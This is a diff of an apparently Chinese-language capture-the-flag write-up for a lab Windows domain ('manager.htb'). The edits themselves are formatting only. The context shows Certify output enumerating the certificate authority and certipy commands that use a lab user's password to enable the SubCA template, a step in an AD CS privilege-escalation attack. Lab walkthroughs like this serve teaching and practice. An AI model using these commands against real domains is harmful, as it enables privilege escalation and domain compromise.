@@ -218,8 +218,8 @@
 
 
 ### 1.2.5 TCP 1433 MSSQL
-
-​		tcp 1433口的mssql非常值得探索，如果我们能够获取mssql的高权限账户，那么我们就能够获取shell。如果我找到了一些凭证后会回来尝试连接mssql。
+   
+   tcp 1433口的mssql非常值得探索，如果我们能够获取mssql的高权限账户，那么我们就能够获取shell。如果我找到了一些凭证后会回来尝试连接mssql。
 
 
 
@@ -587,7 +587,7 @@
    
    [*] Action: Find certificate templates
    [*] Using current user's unrolled group SIDs for vulnerability checks.
-[*] Using the search base 'CN=Configuration,DC=manager,DC=htb'
+   [*] Using the search base 'CN=Configuration,DC=manager,DC=htb'
    
    [*] Listing info about the Enterprise CA 'manager-DC01-CA'
    
@@ -633,14 +633,14 @@
    使用 `-enable-template` 参数在 CA 上启用 `SubCA` 模板。默认情况下， `SubCA` 模板已启用。
 
    ```
-   # List templates
+   List templates
    └─# certipy ca -ca 'manager-DC01-CA' -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -enable-template 'SubCA'  
-   ## If SubCA is not there, you need to enable it
+   If SubCA is not there, you need to enable it
    
-   # Enable SubCA
+   Enable SubCA
    certipy ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
    
-   #正确响应
+   正确响应
    Certipy v4.0.0 - by Oliver Lyak (ly4k)
    
    [*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
